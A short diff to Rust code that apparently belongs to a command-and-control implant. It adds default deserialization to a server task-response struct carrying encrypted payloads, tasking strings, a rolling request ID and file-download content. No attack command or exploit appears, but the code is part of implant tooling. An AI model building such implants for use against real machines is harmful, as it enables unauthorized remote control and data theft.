@@ -33,7 +33,7 @@ pub struct CallbackRequest<'a> {
 }
 
 /// Response from the server containing a task
-#[derive(serde::Deserialize)]
+#[derive(serde::Deserialize, Default)]
 pub struct TaskResponse {
     /// Hex-encoded encrypted payload (nonce || ciphertext)
     #[serde(default)]
@@ -45,6 +45,7 @@ pub struct TaskResponse {
     #[serde(default)]
     pub tasking: String,
     /// Rolling request ID; implant must echo this on the next call
+    #[serde(default)]
     pub x_request_id: String,
     /// For file download tasks, contains base64 encoded file content
     #[serde(default)]
